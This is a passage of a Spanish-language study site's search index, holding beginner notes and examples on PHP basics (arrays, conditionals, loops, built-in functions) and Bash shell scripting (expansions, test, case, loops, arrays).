var_dump ( $diccionario ); echo \"</pre>\" ; // si utiliamos print_r() tenemos menos informaci\u00f3n pero mas claro echo \"diccionario con print_r<br/>\" ; print_r ( $diccionario ); echo \" <br/><br/> Lista <br/>\" ; echo \"<pre>\" ; var_dump ( $lista ); echo \"</pre>\" ; echo \"Lista con print_r <br/>\" ; print_r ( $lista ); ?> Constantes <?php define ( 'PI' , 3.14 ); define ( 'NOMBRE' , \"Jorge\" ); echo PI ; echo NOMBRE ; ?> Arreglos Listas <?php // Listas echo 'Listas' . '<br />' ; // metodo antiguo $semana = array ( 'lunes' , 'Mares' , 'Miercoles' , 'Jueves' ); // meodoactual $semana2 = [ 'lunes' , 'Mares' , 'Miercoles' , 'Jueves' ]; // mostrar lista echo $semana [ 0 ] . '<br />' ; echo $semana2 [ 0 ]; // a\u00f1air item a lista $semana [ 4 ] = 'Viernes' ; echo $semana [ 4 ]; ?> Diccionarios <?php // dicionarios echo 'Diccionarios' . '<br />' ; // Diccionarios $persona = [ 'telefono' => 6268564 , 'apellido' => 'Pastor' , 'pais' => 'Espa\u00f1a' ]; echo $persona [ 'telefono' ] . '<br />' ; echo $persona [ 'apellido' ] . '<br />' ; echo $persona [ 'pais' ] . '<br />' ; // cambio telefono echo '<br />' . 'Cambio telf' . '<br />' ; $persona [ 'telefono' ] = 64687941 ; echo $persona [ 'telefono' ] . '<br />' ; ?> Matrices <?php echo 'Listas multiples' . '<br />' ; $amigos = array ( //posici\u00f3n 0 1 array ( 'Jorge' , 29 ), //posici\u00f3n 0 array ( 'Alex' , 20 ), //posici\u00f3n 1 array ( 'Pedro' , 40 ) //posici\u00f3n 2 ); echo $amigos [ 0 ][ 0 ] . '<br />' ; echo $amigos [ 1 ][ 0 ] . '<br />' ; echo $amigos [ 2 ][ 0 ] . '<br />' ; ?> Contando items \"count\" <?php // contando items de array echo 'N\u00famero de items en lista' . '<br />' ; $meses = array ( 'Enero' , 'Febrero' , 'Marzo' , 'Abril' , 'Mayo' , 'Junio' , 'Julio' , 'Agosto' , 'Septiembre' , 'Octubre' , 'Nobiembre' , 'Diciembre' ); // count muestra total de items de lista echo \"La lista meses tiene \" . count ( $meses ) . ' meses' ; echo '<br />' ; // count -1 resta 1 ya que indice empieza en 0 $ultimo_mes = count ( $meses ) - 1 ; echo \"El ultimo mes es $meses[$ultimo_mes] \" ; ?> Recorrer lista Recorriendo y ordenando listas con: foreach() Ordena tanto caracteres como n\u00fameros sort() rsort() <?php $meses = array ( 'Enero' , 'Febrero' , 'Marzo' , 'Abril' , 'Mayo' , 'Junio' , 'Julio' , 'Agosto' , 'Septiembre' , 'Octubre' , 'Nobiembre' , 'Diciembre' ); $persona = array ( 'Telefono' => 626585941 , 'Edad' => 30 , 'Ciudad' => 'Barcelona' ); ?> <!DOCTYPE html> <html> <head> <meta charset=\"utf-8\"> <title>Mese del a\u00f1o</title> </head> <body> <h1>meses del a\u00f1o</h1> <ul> <?php // es un for recorre lista meses foreach ( $meses as $mes ) { echo '<li>' . $mes . '</li>' ; } ?> </ul> <br> <h3>ordenado alfabeticamente con sort</h3> <ul> <?php // ordena la lista alfabeticamente sort ( $meses ); // es un for recorre lista meses foreach ( $meses as $mes ) { echo '<li>' . $mes . '</li>' ; } ?> </ul> <br> <h3>ordenado al reves con rsort</h3> <ul> <?php // ordena la lista al reves rsort ( $meses ); // es un for recorre lista meses foreach ( $meses as $mes ) { echo '<li>' . $mes . '</li>' ; } ?> </ul> <h3>recorriendo valores de diccionario</h3> <ul> <?php // es un for recorre diccionario persona foreach ( $persona as $dato => $valor ) { echo '<li>' . $dato . ' : ' . $valor . '</li>' ; } ?> </ul> </body> </html> If Condicional if <?php $edad = 1 ; // issed muestra si la variable tiene alguna asignaci\u00f3n // si es true marca 1 si es false 0 echo isset ( $edad ); echo \"<br />\" ; // si la condici\u00f3n es cierta se signa la priomera opcion si no la segunda // como no emos asignado nada a edad2 es false 2 opcion. $edad2 = ( isset ( $edad2 )) ? $edad2 : 'El usuario no a establecido su edad' ; echo \"Edad: \" . $edad2 . \"<br />\" ;; $edad3 = 19 ; // como edad3 cumple la condici\u00f3n muestra primera opci\u00f3n $edad3 = ( $edad3 >= 18 ) ? 'Eres mayor de edad' : 'Eres menor' ; echo $edad3 ; ?> If else if else <?php $mes = \"Diciembre\" ; /* condicionalesd < > == != <= >= ! || && XOR xor a de coincidir 1 condici\u00f3n pero solo 1 */ // condicio if, else if, else con or if ( $mes == 'Diciembre' || $mes == 'Enero' || $mes == 'Febrero' ){ echo \"Es invierno\" ; } else if ( $mes == 'Marzo' || $mes == 'Abril' || $mes == 'Mayo' ){ echo 'Es primavera' ; } else { echo 'Me a dado peceza seguir escribiendo adivina' ; } ?> Operadores <?php /* Opreadores + - / * % */ $numero = 10 ; $numero2 = 5 ; $resultado = $numero + $numero2 ; echo \"Resultado suma simple\" . $resultado . '<br />' ; ?> Asignaci\u00f3n <?php /* Operador de asignaci\u00f3n =, +=, -=, /=, *= */ // es lo mismo pero de forma reducida //$numero = $numero + 7; $numero += 7 ; echo \"Resultado Asignaci\u00f3n\" . $numero . '<br />' ; ?> Comparaci\u00f3n <?php /* Operadores comparaci\u00f3n == === !=, <> !== < > <= >= && || */ $numero = '10' ; // el comparador === a de ser identico tanto en valor como en tipo // en este caso es diferente uno es String otro integrer // l\u00f1o mismo pasas con el diferente !== if ( $numero === 10 ){ echo \"ES identico\" . '<br />' ; } else { echo \"Es diferente\" . '<br />' ; } ?> Incremento / decremento <?php /* Operadores Incremento / Decremento ++$x $x++ --$x $x-- */ $numero = 5 ; echo \"Numero: \" . $numero . '<br />' ; // incrementa despues de pasar la linea echo \"incrementa despues de pasar la linea\" . $numero ++ . '<br />' ; echo \"Numero: \" . $numero . '<br />' ; // incrementa en la misma linea echo \"incrementa en la misma linea\" . ++ $numero . '<br />' ; ?> Cadenas <?php /* Operadores cadenas . .= */ $texto = 'Primer texto' ; // con .= concatenamos el texto $texto .= ' Segundo texto' ; echo \" $texto \" ; ?> switch ( menu ) <?php $mes = 'Enero' ; switch ( $mes ) { case 'Diciembre' : echo \"Feliz Navidad\" ; break ; case 'Enero' : echo \"Feliz a\u00f1o\" ; break ; default : echo \"opcion no permitida\" ; break ; } ?> Bucles For <?php // bucle for for ( $i = 1 ; $i <= 10 ; $i ++ ) { echo \"for $i <br />\" ; } ?> While, do while <?php // bucle while $x = 1 ; while ( $x <= 10 ) { echo \"while $x <br />\" ; $x ++ ; } // bucle do while echo \"<br/>\" ; // se ejecuitara el codico como m\u00ednmimo 1 vez, si cumple la condici\u00f3n // se ejecutara de nuevo si no, no. $a = 1 ; do { echo \"Do while $a <br/>\" ; $a ++ ; } while ( $a <= 10 ); ?> Recorrer lista <?php $meses = array ( 'Enero' , 'Febrero' , 'Marzo' , 'Abril' , 'Mayo' , 'Junio' , 'Julio' , 'Agosto' , 'Septiembre' , 'Octubre' , 'Nobiembre' , 'Diciembre' ); // recorrer lista con for echo \"Recorrer lista con for <br/>\" ; for ( $i = 0 ; $i < count ( $meses ); $i ++ ) { echo $meses [ $i ] . \"<br/>\" ; } //recorrer lista con while echo \"<br/>\" ; echo \"Recorrer lista con while <br/>\" ; $contador = 0 ; while ( $contador <= 10 ) { echo $meses [ $contador ] . \"<br/>\" ; $contador ++ ; } ?> Funciones <?php $num = 6 ; $num2 = '5' ; $texto = 'hola' ; $diccionario = array ( 'nombre' => 'jorge' , 'edad' => 30 ); $lista = array ( 'pedro' , 'juan' , 'silvia' ); $boleano = true ; echo \"Numero normal <br/>\" ; var_dump ( $num ); echo \"<br/><br/> numero en String <br/>\" ; var_dump ( $num2 ); echo \"<br/><br/> Texto <br/>\" ; var_dump ( $texto ); echo \"<br/><br/> boleano <br/>\" ; var_dump ( $boleano ); echo \"<br/><br/> boleano print_r debuelve false 0 o true 1<br/>\" ; print_r ( $boleano ); // utilizando pre a\u00f1adimos la salida literal en este caso algo mqas claro echo \"<br/><br/> diccionario <br/>\" ; echo \"<pre>\" ; var_dump ( $diccionario ); echo \"</pre>\" ; // si utiliamos print_r() tenemos menos informaci\u00f3n pero mas claro echo \"diccionario con print_r<br/>\" ; print_r ( $diccionario ); echo \" <br/><br/> Lista <br/>\" ; echo \"<pre>\" ; var_dump ( $lista ); echo \"</pre>\" ; echo \"Lista con print_r <br/>\" ; print_r ( $lista ); ?> <?php // extract() extrae keys de diccionarios a variables // array_pop() extrae y el\u00f1imina ultimo item de lista // join() a\u00f1ade lo que quieras entre item e item de lista // array_reverse() invierte la lista // round() redonmdea // ceil() redondea al alza 12,1 es 13 // rand() numero aleatorio $persona = array ( 'telefono' => 626485795 , 'edad' => 20 , 'pais' => 'francia' ); // extract extrae las key como variables extract ( $persona ); echo $telefono ; echo \"<br/><br/>\" ; $semana = array ( 'lunes' , 'martes' , 'miercoles' , 'jueves' , 'viernes' , 'sabado' , 'domingo' ); // array_pop extrae y elimina el ultimo item de las listas $ultimo_dia = array_pop ( $semana ); foreach ( $semana as $dia ) { echo \"dia: \" . $dia . \"<br/>\" ; } echo \"Y el dia extraido es: \" . $ultimo_dia . '<br/>' ; // a\u00f1ade lo que quieras entre item e item echo join ( ' - ' , $semana ); echo \"<br/><br/>\" ; // array_reverse invierte el orden de la lista $invertida = array_reverse ( $semana ); echo join ( ' - ' , $invertida ); echo \"<br/><br/>\" ; echo \"redondeando <br/>\" ; echo round ( 15.245 ); echo \"<br/>\" ; // redondea y especifico 1 decimal a mostrar echo round ( 18.254 , 1 ); echo \"<br/><br/>\" ; echo \"redondeando al alza<br/>\" ; echo ceil ( 12.1 ); echo \"<br/><br/>\" ; // numero aleatorio echo \"Numero aleatorio <br/>\" ; echo rand ( 1 , 100 ); ?>","title":"Fundamentos php"},{"location":"lenguajes/Fundamentos_php/#fundamentos-php","text":"","title":"Fundamentos php"},{"location":"lenguajes/Fundamentos_php/#variables","text":"<?php // variables //String $nombre = \"Jorge\" ; // integrer $numero = 7 ; //double $decimal = 7.7 ; //bolean (true/false) $verdadero = true ; // concatenar con . \"punto\" echo 'Hola, ' . $nombre ; // gettype muestra tipo de variables echo gettype ( $nombre ); ?>","title":"Variables"},{"location":"lenguajes/Fundamentos_php/#valor-variables","text":"<?php $num = 6 ; $num2 = '5' ; $texto = 'hola' ; $diccionario = array ( 'nombre' => 'jorge' , 'edad' => 30 ); $lista = array ( 'pedro' , 'juan' , 'silvia' ); $boleano = true ; echo \"Numero normal <br/>\" ; var_dump ( $num ); echo \"<br/><br/> numero en String <br/>\" ; var_dump ( $num2 ); echo \"<br/><br/> Texto <br/>\" ; var_dump ( $texto ); echo \"<br/><br/> boleano <br/>\" ; var_dump ( $boleano ); echo \"<br/><br/> boleano print_r debuelve false 0 o true 1<br/>\" ; print_r ( $boleano ); // utilizando pre a\u00f1adimos la salida literal en este caso algo mqas claro echo \"<br/><br/> diccionario <br/>\" ; echo \"<pre>\" ; var_dump ( $diccionario ); echo \"</pre>\" ; // si utiliamos print_r() tenemos menos informaci\u00f3n pero mas claro echo \"diccionario con print_r<br/>\" ; print_r ( $diccionario ); echo \" <br/><br/> Lista <br/>\" ; echo \"<pre>\" ; var_dump ( $lista ); echo \"</pre>\" ; echo \"Lista con print_r <br/>\" ; print_r ( $lista ); ?>","title":"Valor variables"},{"location":"lenguajes/Fundamentos_php/#constantes","text":"<?php define ( 'PI' , 3.14 ); define ( 'NOMBRE' , \"Jorge\" ); echo PI ; echo NOMBRE ; ?>","title":"Constantes"},{"location":"lenguajes/Fundamentos_php/#arreglos","text":"","title":"Arreglos"},{"location":"lenguajes/Fundamentos_php/#listas","text":"<?php // Listas echo 'Listas' . '<br />' ; // metodo antiguo $semana = array ( 'lunes' , 'Mares' , 'Miercoles' , 'Jueves' ); // meodoactual $semana2 = [ 'lunes' , 'Mares' , 'Miercoles' , 'Jueves' ]; // mostrar lista echo $semana [ 0 ] . '<br />' ; echo $semana2 [ 0 ]; // a\u00f1air item a lista $semana [ 4 ] = 'Viernes' ; echo $semana [ 4 ]; ?>","title":"Listas"},{"location":"lenguajes/Fundamentos_php/#diccionarios","text":"<?php // dicionarios echo 'Diccionarios' . '<br />' ; // Diccionarios $persona = [ 'telefono' => 6268564 , 'apellido' => 'Pastor' , 'pais' => 'Espa\u00f1a' ]; echo $persona [ 'telefono' ] . '<br />' ; echo $persona [ 'apellido' ] . '<br />' ; echo $persona [ 'pais' ] . '<br />' ; // cambio telefono echo '<br />' . 'Cambio telf' . '<br />' ; $persona [ 'telefono' ] = 64687941 ; echo $persona [ 'telefono' ] . '<br />' ; ?>","title":"Diccionarios"},{"location":"lenguajes/Fundamentos_php/#matrices","text":"<?php echo 'Listas multiples' . '<br />' ; $amigos = array ( //posici\u00f3n 0 1 array ( 'Jorge' , 29 ), //posici\u00f3n 0 array ( 'Alex' , 20 ), //posici\u00f3n 1 array ( 'Pedro' , 40 ) //posici\u00f3n 2 ); echo $amigos [ 0 ][ 0 ] . '<br />' ; echo $amigos [ 1 ][ 0 ] . '<br />' ; echo $amigos [ 2 ][ 0 ] . '<br />' ; ?>","title":"Matrices"},{"location":"lenguajes/Fundamentos_php/#contando-items-count","text":"<?php // contando items de array echo 'N\u00famero de items en lista' . '<br />' ; $meses = array ( 'Enero' , 'Febrero' , 'Marzo' , 'Abril' , 'Mayo' , 'Junio' , 'Julio' , 'Agosto' , 'Septiembre' , 'Octubre' , 'Nobiembre' , 'Diciembre' ); // count muestra total de items de lista echo \"La lista meses tiene \" . count ( $meses ) . ' meses' ; echo '<br />' ; // count -1 resta 1 ya que indice empieza en 0 $ultimo_mes = count ( $meses ) - 1 ; echo \"El ultimo mes es $meses[$ultimo_mes] \" ; ?>","title":"Contando items \"count\""},{"location":"lenguajes/Fundamentos_php/#recorrer-lista","text":"Recorriendo y ordenando listas con: foreach() Ordena tanto caracteres como n\u00fameros sort() rsort() <?php $meses = array ( 'Enero' , 'Febrero' , 'Marzo' , 'Abril' , 'Mayo' , 'Junio' , 'Julio' , 'Agosto' , 'Septiembre' , 'Octubre' , 'Nobiembre' , 'Diciembre' ); $persona = array ( 'Telefono' => 626585941 , 'Edad' => 30 , 'Ciudad' => 'Barcelona' ); ?> <!DOCTYPE html> <html> <head> <meta charset=\"utf-8\"> <title>Mese del a\u00f1o</title> </head> <body> <h1>meses del a\u00f1o</h1> <ul> <?php // es un for recorre lista meses foreach ( $meses as $mes ) { echo '<li>' . $mes . '</li>' ; } ?> </ul> <br> <h3>ordenado alfabeticamente con sort</h3> <ul> <?php // ordena la lista alfabeticamente sort ( $meses ); // es un for recorre lista meses foreach ( $meses as $mes ) { echo '<li>' . $mes . '</li>' ; } ?> </ul> <br> <h3>ordenado al reves con rsort</h3> <ul> <?php // ordena la lista al reves rsort ( $meses ); // es un for recorre lista meses foreach ( $meses as $mes ) { echo '<li>' . $mes . '</li>' ; } ?> </ul> <h3>recorriendo valores de diccionario</h3> <ul> <?php // es un for recorre diccionario persona foreach ( $persona as $dato => $valor ) { echo '<li>' . $dato . ' : ' . $valor . '</li>' ; } ?> </ul> </body> </html>","title":"Recorrer lista"},{"location":"lenguajes/Fundamentos_php/#if","text":"","title":"If"},{"location":"lenguajes/Fundamentos_php/#condicional-if","text":"<?php $edad = 1 ; // issed muestra si la variable tiene alguna asignaci\u00f3n // si es true marca 1 si es false 0 echo isset ( $edad ); echo \"<br />\" ; // si la condici\u00f3n es cierta se signa la priomera opcion si no la segunda // como no emos asignado nada a edad2 es false 2 opcion. $edad2 = ( isset ( $edad2 )) ? $edad2 : 'El usuario no a establecido su edad' ; echo \"Edad: \" . $edad2 . \"<br />\" ;; $edad3 = 19 ; // como edad3 cumple la condici\u00f3n muestra primera opci\u00f3n $edad3 = ( $edad3 >= 18 ) ? 'Eres mayor de edad' : 'Eres menor' ; echo $edad3 ; ?>","title":"Condicional if"},{"location":"lenguajes/Fundamentos_php/#if-else-if-else","text":"<?php $mes = \"Diciembre\" ; /* condicionalesd < > == != <= >= ! || && XOR xor a de coincidir 1 condici\u00f3n pero solo 1 */ // condicio if, else if, else con or if ( $mes == 'Diciembre' || $mes == 'Enero' || $mes == 'Febrero' ){ echo \"Es invierno\" ; } else if ( $mes == 'Marzo' || $mes == 'Abril' || $mes == 'Mayo' ){ echo 'Es primavera' ; } else { echo 'Me a dado peceza seguir escribiendo adivina' ; } ?>","title":"If else if else"},{"location":"lenguajes/Fundamentos_php/#operadores","text":"<?php /* Opreadores + - / * % */ $numero = 10 ; $numero2 = 5 ; $resultado = $numero + $numero2 ; echo \"Resultado suma simple\" . $resultado . '<br />' ; ?>","title":"Operadores"},{"location":"lenguajes/Fundamentos_php/#asignacion","text":"<?php /* Operador de asignaci\u00f3n =, +=, -=, /=, *= */ // es lo mismo pero de forma reducida //$numero = $numero + 7; $numero += 7 ; echo \"Resultado Asignaci\u00f3n\" . $numero . '<br />' ; ?>","title":"Asignaci\u00f3n"},{"location":"lenguajes/Fundamentos_php/#comparacion","text":"<?php /* Operadores comparaci\u00f3n == === !=, <> !== < > <= >= && || */ $numero = '10' ; // el comparador === a de ser identico tanto en valor como en tipo // en este caso es diferente uno es String otro integrer // l\u00f1o mismo pasas con el diferente !== if ( $numero === 10 ){ echo \"ES identico\" . '<br />' ; } else { echo \"Es diferente\" . '<br />' ; } ?>","title":"Comparaci\u00f3n"},{"location":"lenguajes/Fundamentos_php/#incremento-decremento","text":"<?php /* Operadores Incremento / Decremento ++$x $x++ --$x $x-- */ $numero = 5 ; echo \"Numero: \" . $numero . '<br />' ; // incrementa despues de pasar la linea echo \"incrementa despues de pasar la linea\" . $numero ++ . '<br />' ; echo \"Numero: \" . $numero . '<br />' ; // incrementa en la misma linea echo \"incrementa en la misma linea\" . ++ $numero . '<br />' ; ?>","title":"Incremento / decremento"},{"location":"lenguajes/Fundamentos_php/#cadenas","text":"<?php /* Operadores cadenas . .= */ $texto = 'Primer texto' ; // con .= concatenamos el texto $texto .= ' Segundo texto' ; echo \" $texto \" ; ?>","title":"Cadenas"},{"location":"lenguajes/Fundamentos_php/#switch-menu","text":"<?php $mes = 'Enero' ; switch ( $mes ) { case 'Diciembre' : echo \"Feliz Navidad\" ; break ; case 'Enero' : echo \"Feliz a\u00f1o\" ; break ; default : echo \"opcion no permitida\" ; break ; } ?>","title":"switch ( menu )"},{"location":"lenguajes/Fundamentos_php/#bucles","text":"","title":"Bucles"},{"location":"lenguajes/Fundamentos_php/#for","text":"<?php // bucle for for ( $i = 1 ; $i <= 10 ; $i ++ ) { echo \"for $i <br />\" ; } ?>","title":"For"},{"location":"lenguajes/Fundamentos_php/#while-do-while","text":"<?php // bucle while $x = 1 ; while ( $x <= 10 ) { echo \"while $x <br />\" ; $x ++ ; } // bucle do while echo \"<br/>\" ; // se ejecuitara el codico como m\u00ednmimo 1 vez, si cumple la condici\u00f3n // se ejecutara de nuevo si no, no. $a = 1 ; do { echo \"Do while $a <br/>\" ; $a ++ ; } while ( $a <= 10 ); ?>","title":"While, do while"},{"location":"lenguajes/Fundamentos_php/#recorrer-lista_1","text":"<?php $meses = array ( 'Enero' , 'Febrero' , 'Marzo' , 'Abril' , 'Mayo' , 'Junio' , 'Julio' , 'Agosto' , 'Septiembre' , 'Octubre' , 'Nobiembre' , 'Diciembre' ); // recorrer lista con for echo \"Recorrer lista con for <br/>\" ; for ( $i = 0 ; $i < count ( $meses ); $i ++ ) { echo $meses [ $i ] . \"<br/>\" ; } //recorrer lista con while echo \"<br/>\" ; echo \"Recorrer lista con while <br/>\" ; $contador = 0 ; while ( $contador <= 10 ) { echo $meses [ $contador ] . \"<br/>\" ; $contador ++ ; } ?>","title":"Recorrer lista"},{"location":"lenguajes/Fundamentos_php/#funciones","text":"<?php $num = 6 ; $num2 = '5' ; $texto = 'hola' ; $diccionario = array ( 'nombre' => 'jorge' , 'edad' => 30 ); $lista = array ( 'pedro' , 'juan' , 'silvia' ); $boleano = true ; echo \"Numero normal <br/>\" ; var_dump ( $num ); echo \"<br/><br/> numero en String <br/>\" ; var_dump ( $num2 ); echo \"<br/><br/> Texto <br/>\" ; var_dump ( $texto ); echo \"<br/><br/> boleano <br/>\" ; var_dump ( $boleano ); echo \"<br/><br/> boleano print_r debuelve false 0 o true 1<br/>\" ; print_r ( $boleano ); // utilizando pre a\u00f1adimos la salida literal en este caso algo mqas claro echo \"<br/><br/> diccionario <br/>\" ; echo \"<pre>\" ; var_dump ( $diccionario ); echo \"</pre>\" ; // si utiliamos print_r() tenemos menos informaci\u00f3n pero mas claro echo \"diccionario con print_r<br/>\" ; print_r ( $diccionario ); echo \" <br/><br/> Lista <br/>\" ; echo \"<pre>\" ; var_dump ( $lista ); echo \"</pre>\" ; echo \"Lista con print_r <br/>\" ; print_r ( $lista ); ?> <?php // extract() extrae keys de diccionarios a variables // array_pop() extrae y el\u00f1imina ultimo item de lista // join() a\u00f1ade lo que quieras entre item e item de lista // array_reverse() invierte la lista // round() redonmdea // ceil() redondea al alza 12,1 es 13 // rand() numero aleatorio $persona = array ( 'telefono' => 626485795 , 'edad' => 20 , 'pais' => 'francia' ); // extract extrae las key como variables extract ( $persona ); echo $telefono ; echo \"<br/><br/>\" ; $semana = array ( 'lunes' , 'martes' , 'miercoles' , 'jueves' , 'viernes' , 'sabado' , 'domingo' ); // array_pop extrae y elimina el ultimo item de las listas $ultimo_dia = array_pop ( $semana ); foreach ( $semana as $dia ) { echo \"dia: \" . $dia . \"<br/>\" ; } echo \"Y el dia extraido es: \" . $ultimo_dia . '<br/>' ; // a\u00f1ade lo que quieras entre item e item echo join ( ' - ' , $semana ); echo \"<br/><br/>\" ; // array_reverse invierte el orden de la lista $invertida = array_reverse ( $semana ); echo join ( ' - ' , $invertida ); echo \"<br/><br/>\" ; echo \"redondeando <br/>\" ; echo round ( 15.245 ); echo \"<br/>\" ; // redondea y especifico 1 decimal a mostrar echo round ( 18.254 , 1 ); echo \"<br/><br/>\" ; echo \"redondeando al alza<br/>\" ; echo ceil ( 12.1 ); echo \"<br/><br/>\" ; // numero aleatorio echo \"Numero aleatorio <br/>\" ; echo rand ( 1 , 100 ); ?>","title":"Funciones"},{"location":"lenguajes/Shell/","text":"Shell orden && orden and : si va bien la primera orden ara la segunda. orden || orden or : si no va bien la primera ejecuta la segunta Comand substitution Ejecutar una orden para ser ejecutada por otra orden: file $(ls) Ejemplo: - finger $(whoami) rpm -ql $(rpm -qf $( which $orden ) ) Primero se ejecuta orden Segundo which Tercero rpm queri file con todo el resultado cuarto rpm queri list Brace Expansion Sintaxis echo nom { 1 ,2,3 } # crea 3 resultado acabados en 1 2 3 echo nom { 1 ..10 } # crea 10 resultados acavados del 1 al 10 echo nom { 1 ,2, { 30 ..35 } ,hola } # crea resultado acabados en 1 2 hola y u rango de 30 al 35 echo nom { 1 ,2, { a..h }} # crea resultado acabados en 1 2 y un rango de a, a la h echo nom { 1 ,2,3 } nom1 nom2 nom3 Aritmetic expansion Calculos matematicos echo $(( 2 * 4 )) 8 max = 30 echo $(( 365 - $max )) 335 Tilde expansion ~ El home de usuario actual ~root El home de usuario indicado Quoting \"\" expansion '' literal \\ escapar caracteres de significado especial ( por ejemplo espacios, comillas, etc.. Ordenes Que pasa al apretar enter. Expansion / interpretaci\u00f3n Ejecuci\u00f3n alias internas externas ( path ) Si la expansi\u00f3n falla la ejecuci\u00f3n no ejecuta. rm * - Primero interpreta el asterisco con todos los archivos del directorio - Despues los pasa al rm para que procese. Internas Externas Ordenes externas son las que tienen ruta en el PATH. Ordenes internas son las ordenes del sistema. enable -a # mirar internas enable -n logout # deshabilitar interna enable logout # volver a habilitar rpm Ver paquete de un fichero: rpm -qf /usr/bin/ps ver contenido del paquete rpl -ql paquete Bash Scripting Estructura de un script La primera l\u00ednea de un script siempre sera, que tipo de c\u00f3digo lo interpreta, a esta l\u00ednea se le denomina: shebang #!/bin/bash ejecutar bash prog.sh # si tiene permisos de ejecuci\u00f3n, ejecuta y mata shell . ./prog.sh bash ejecuta en un subproceso . ejecuta el programa y mata la shell Argumentos $# # numero total de argumentos $* # lista de argumentos $@ # lista de argumentos # argumento numero tal $0 $1 $2 $3 ${ 10 } La diferencia entre $* y $@ es que al encapsular-los entre \"\" , \"$*\" ignora los espacios entre argumentos y lo muestra como uno, y \"$@\" representa cada espacio como argumento separado. -e interpretar expansiones tipo \\n \\t etc... -n salida sin salto de linea. los programas de administraci\u00f3n no seran interactivos. Test Test cheque tipo de archivos y compara valores. todas sus opciones en man test # algunas de sus opciones para ficheros -L es link -f fichers regulares -d directorio -e existe -o dispositivo de bloques -x archivo ejecutable -w permisos de escritura -r permisos de lectura -n not null # en cadenas -n \"algo\" cadena no vacia true -z \"\" cadena vacia true = iguales ! = diferentes = ~ conpara con expresion regular # comparadores numericos -gt > -lt < -ge > = -le < = -eq == -ne ! = -a and -o or ! not # operadores aritmeticos + suma - resta \\* multiplicar / dividir % modulo ( resto ) La condici\u00f3n realmente ejecuta un test, que devuelve true o false. sintaxis: test $n -lt 18 [ $n -lt 18 ] test se a actualizado y trae algunas funcionalidades extra, como: # si un archivo tiene espacios en su nombre if [ -f \" $file \" ] if [[ -f $file ]] # aceptar expresiones regulares if [ \" $answer \" = y -o \" $answer \" = yes ] if [[ $answer = ~ ^y ( es ) ?$ ]] # acepta parentesis y las expresiones && || ! [ 5 -lt 7 -a ! 5 -gt 7 ] [[ 5 -lt 7 && ! ( 5 -gt 7 ) ]] # permite comparar texto segun su numero asci [[ \"a\" < \"z\" ]] Condicionales Sentencia if if [ $edad -ge 18 ] then echo \"Mayor de edad\" else echo \"Menor de edad\" fi Sentencia elif if [ $edad -lt 18 ] then echo \"Menor edad\" elif [ $edad -lt 65 ] then echo \"Edad laboral\" else echo \"jubilat\" fi Prohibido repetir la misma instrucci\u00f3n dentro de if, elif, else, etc.. a no se que sea absolutamiento necesario. Case Case evalua valores lletra = $1 case $lletra in 'a' | 'e' | 'i' | 'o' | 'u' ) echo \" $lletra es una vocal\" ;; * ) echo \" $lletra es una constant\" ;; esac exit 0 indicas los valores a evaluar y si no existe el * es el comod\u00edn, como si fuera un else. Bucles for Itera per a cada element d'una llista finita hay errores irrecuperables y recuperables las irrecuperables -- plegas las recuperables -- continuar pero: 1 informando que se a generado un error por stderr $? status error final especifico # coge la lista como 1 elemento al insertar la variable entre \"\" llista = \"per pau edu anna\" for nom in \" $llista \" do echo $nom done # diferencia cada nombre por separado llista = \"per pau edu anna\" for nom in $llista do echo $nom done for i in $( seq 1 1 5 ) ; # ( inicio incremento final ) do echo $i done for (( i = 0 ; i < = 5 ; i++ )) # ( inicio ; final ; incremento ) do echo \" $i \" done Listando tipos de ficheros: dirs = $* for dir in $dirs do if ! [ -d $dir ] then echo \"Error: el argument a de ser un directori\" >> /dev/stderr echo \"Usage: prog dir[...]\" >> /dev/stderr else cont = 1 llistatDir = $( ls $dir ) for line in $llistatDir do line = $( echo $dir / $line | tr -s '/' '/' ) if [ -L $line ] then tipus = \"Link\" elif [ -d $line ] then tipus = \"Directori\" elif [ -f $line ] then tipus = \"Fitxer\" else tipus = \"Otra cosa\" fi echo \" $cont : $tipus : $line \" cont = $(( cont+1 )) done fi done while CONTADOR = 0 while [ $CONTADOR -lt 5 ] ; do echo El contador es $CONTADOR let CONTADOR++ done # leer lineas por entrada estandar hasta que encuentre FI read -r line while [ $line ! = \"FI\" ] do echo \" $line \" read -r line done exit 0 # ller lineas por entrada estandar y numerarlas cont = 1 while read -r line do echo \" $cont : $line \" cont = $(( cont+1 )) done exit 0 leer linea por entrada estandar o argumento # bash iterar.sh noms.txt # cat noms.txt | bash iterar.sh # bash iterar.sh < noms.txt file = /dev/stdin if [ $# -eq 1 ] ; then file = $1 fi cont = 0 while read -r line do let cont++ echo \" $cont $line \" # redirijo stdin o el argumento dentro del while done < $file exit 0 Shift shift (desplazar) los argumentos una posici\u00f3n a la izquierda, el argumento en primera posici\u00f3n al hacer shift desaparecer\u00e1 y el 2 estar\u00e1 en la posici\u00f3n 1. los argumentos los trata como una cadena por lo tanto hay que encapsular-los con \"\" para su correcto funcionamiento. # -n not null while [ -n \" $1 \" ] do echo \" $# : $1 \" shift done exit 0 Listas contar caracteres ${#variable} lista =( 2 8 5 7 6 ) echo ${ lista [@] } 2 8 5 7 6 # muestra lista completa echo ${ lista [2] } 5 # muestra el item de la posici\u00f3n 2 echo ${# lista [@] } 5 # items dentro de la lista echo ${ !lista[@] } 0 1 2 3 4 # posiciones de la lista ocupadas Slicing echo ${ lista [@]: 2 } 5 7 6 # muestra de posici\u00f3n 2 hasta el final echo ${ lista [@]: 1 : 2 } 8 5 # muestra desde la posici\u00f3n 1 dos n\u00fameros Sustituir lista =( uno dos tres cuatro ) echo ${ lista [@]#c*o } uno dos tres # borra lo que comienza por c cualquier cosa y o echo ${ lista [@]/cua/CUA } uno dos tres CUAtro # substitulle echo ${ lista [@]//ua/UA } # con 2 // lo hace recursivamente uno dos tres cUAtro # substituye echo ${ lista [@]/%o/XX } unXX dos tres cuatrXX # substituye lo que acaba en o A\u00f1adir items lista =( uno dos tres ) lista [ 3 ]= cuatro echo ${ lista [@] } uno dos tres cuatro lista [ ${# lista [@] } ]= \u201dalgo\u201d # a\u00f1ade al final de la lista echo ${ lista [@] } uno dos tres cuatro algo Quitar item lista =( uno dos tres ) unset lista [ 2 ] echo ${ lista [@] } uno dos Invertir lista l1 =( \"h\" \"o\" \"l\" \"a\" ) invertida =() for i in $( seq ${# l1 [*] } -1 0 ) ; do invertida [ ${# invertida [*] } ]= ${ l1 [*]: $i : 1 } done echo ${ invertida [*] } invertida[${#invertida[*]}]=${l1[*]:$i:1} ${#invertida[*]} Extrae el n\u00famero de items dentro de la lista, para asignar siempre en la ultima posici\u00f3n. ${l1[*]:$i:1} slicing de posici\u00f3n de la vuelta 